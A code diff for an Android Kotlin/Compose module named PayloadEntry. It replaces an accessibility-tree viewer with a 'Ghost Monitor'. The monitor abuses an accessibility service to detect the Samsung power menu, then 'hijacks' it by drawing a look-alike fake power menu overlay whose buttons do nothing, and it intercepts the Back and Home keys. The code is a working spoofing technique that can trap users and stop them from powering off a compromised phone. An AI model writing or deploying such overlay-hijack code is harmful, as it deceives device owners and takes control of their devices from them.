@@ -18,82 +18,112 @@ import com.speedster.DynamicEntry
 import java.io.File
 
 class PayloadEntry : DynamicEntry {
-
-    private val scanResults = mutableStateListOf<String>()
+    private var isOverlayShowing by mutableStateOf(false)
 
     override @Composable fun Render(context: Context, resDir: File) {
-        // Hook into the accessibility stream when the UI is active
+        // 1. Monitor the Tree for the Power Menu
         LaunchedEffect(Unit) {
-            DynamicEntry.log("🧠 Brain Initialized: Scanning UI Tree...")
+            DynamicEntry.log("🕵️ Ghost Monitor Active: Waiting for Power Menu...")
             
             DynamicEntry.accessibilityInterceptor = { event ->
-                if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
-                    event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
-                    
-                    val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
-                    root?.let {
-                        val batch = mutableListOf<String>()
-                        crawl(it, 0, batch)
-                        it.recycle()
-                        
-                        // Update UI with the latest tree snapshot
-                        if (batch.isNotEmpty()) {
-                            scanResults.clear()
-                            scanResults.addAll(batch.take(50)) // Don't explode the RAM
+                val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
+                root?.let {
+                    val nodes = mutableListOf<String>()
+                    findTextNodes(it, nodes)
+                    it.recycle()
+
+                    // Heuristic: If we see these three specific Samsung strings, trigger the hijack
+                    if (nodes.contains("Power off") && nodes.contains("Restart")) {
+                        if (!isOverlayShowing) {
+                            DynamicEntry.log("🎯 Power Menu Detected! Injecting Overlay.")
+                            isOverlayShowing = true
                         }
                     }
                 }
             }
+
+            // 2. Intercept Back/Home keys to dismiss
+            DynamicEntry.keyInterceptor = { event ->
+                if (isOverlayShowing && (event.keyCode == android.view.KeyEvent.KEYCODE_BACK || 
+                    event.keyCode == android.view.KeyEvent.KEYCODE_HOME)) {
+                    isOverlayShowing = false
+                    DynamicEntry.overlayContent = null
+                    false // Allow the system to handle the key to actually go back
+                } else {
+                    false
+                }
+            }
         }
 
-        Column(
+        // 3. Update the Global Overlay Slot
+        SideEffect {
+            if (isOverlayShowing) {
+                DynamicEntry.overlayContent = { FakePowerMenu() }
+            } else {
+                DynamicEntry.overlayContent = null
+            }
+        }
+
+        // Just a status UI for the Shell screen
+        Box(modifier = Modifier.fillMaxSize().background(Color.Black), contentAlignment = androidx.compose.ui.Alignment.Center) {
+            Text("Ghost Overlay Status: ${if(isOverlayShowing) "ACTIVE" else "IDLE"}", color = if(isOverlayShowing) Color.Red else Color.Green)
+        }
+    }
+
+    private fun findTextNodes(node: AccessibilityNodeInfo?, results: MutableList<String>) {
+        if (node == null) return
+        node.text?.let { results.add(it.toString()) }
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i)
+            findTextNodes(child, results)
+            child?.recycle()
+        }
+    }
+
+    @Composable
+    fun FakePowerMenu() {
+        Box(
             modifier = Modifier
                 .fillMaxSize()
-                .background(Color(0xFF121212))
-                .padding(16.dp)
+                .background(Color.Black.copy(alpha = 0.85f)),
+            contentAlignment = androidx.compose.ui.Alignment.Center
         ) {
-            Text(
-                "LIVE UI STREAM",
-                style = MaterialTheme.typography.labelLarge,
-                color = Color.Green,
-                modifier = Modifier.padding(bottom = 8.dp)
-            )
-            
-            LazyColumn(modifier = Modifier.fillMaxSize()) {
-                items(scanResults) { nodeData ->
-                    Text(
-                        text = nodeData,
-                        color = Color.Cyan,
-                        fontSize = 10.sp,
-                        lineHeight = 12.sp,
-                        modifier = Modifier.padding(vertical = 2.dp)
-                    )
+            Column(horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally) {
+                Row { 
+                    PowerButton(name = "Power off", color = Color(0xFF424242), icon = "⏻") 
+                    Spacer(Modifier.width(40.dp))
+                    PowerButton(name = "Restart", color = Color(0xFF2E7D32), icon = "↺") 
                 }
-                
-                item {
-                    Spacer(modifier = Modifier.height(100.dp))
-                    Text("--- End of Current Tree ---", color = Color.Gray, fontSize = 9.sp)
+                Spacer(Modifier.height(40.dp))
+                Row { 
+                    PowerButton(name = "Emergency\nmode", color = Color(0xFFC62828), icon = "⚠") 
+                    Spacer(Modifier.width(40.dp))
+                    PowerButton(name = "Lockdown\nmode", color = Color(0xFF00897B), icon = "🔒") 
+                }
+                Spacer(Modifier.height(100.dp))
+                androidx.compose.material3.Button(
+                    onClick = { },
+                    colors = androidx.compose.material3.ButtonDefaults.buttonColors(containerColor = Color(0xFF333333))
+                ) {
+                    Text("Side key settings", color = Color.White)
                 }
             }
         }
     }
 
-    private fun crawl(node: AccessibilityNodeInfo?, depth: Int, results: MutableList<String>) {
-        if (node == null) return
-
-        val indent = "  ".repeat(depth)
-        val text = node.text?.toString() ?: node.contentDescription?.toString() ?: ""
-        val id = node.viewIdResourceName?.split("/")?.lastOrNull() ?: ""
-        val className = node.className?.split(".")?.lastOrNull() ?: "View"
-
-        if (text.isNotBlank() || id.isNotBlank()) {
-            results.add("$indent[$className] id:$id -> \"$text\"")
-        }
-
-        for (i in 0 until node.childCount) {
-            val child = node.getChild(i)
-            crawl(child, depth + 1, results)
-            child?.recycle() 
+    @Composable
+    fun PowerButton(name: String, color: Color, icon: String) {
+        Column(horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally) {
+            Box(
+                modifier = Modifier
+                    .size(80.dp)
+                    .background(color, androidx.compose.foundation.shape.CircleShape),
+                contentAlignment = androidx.compose.ui.Alignment.Center
+            ) {
+                Text(icon, color = Color.White, fontSize = 30.sp)
+            }
+            Spacer(Modifier.height(8.dp))
+            Text(name, color = Color.White, fontSize = 14.sp, textAlign = androidx.compose.ui.text.style.TextAlign.Center)
         }
     }
 }
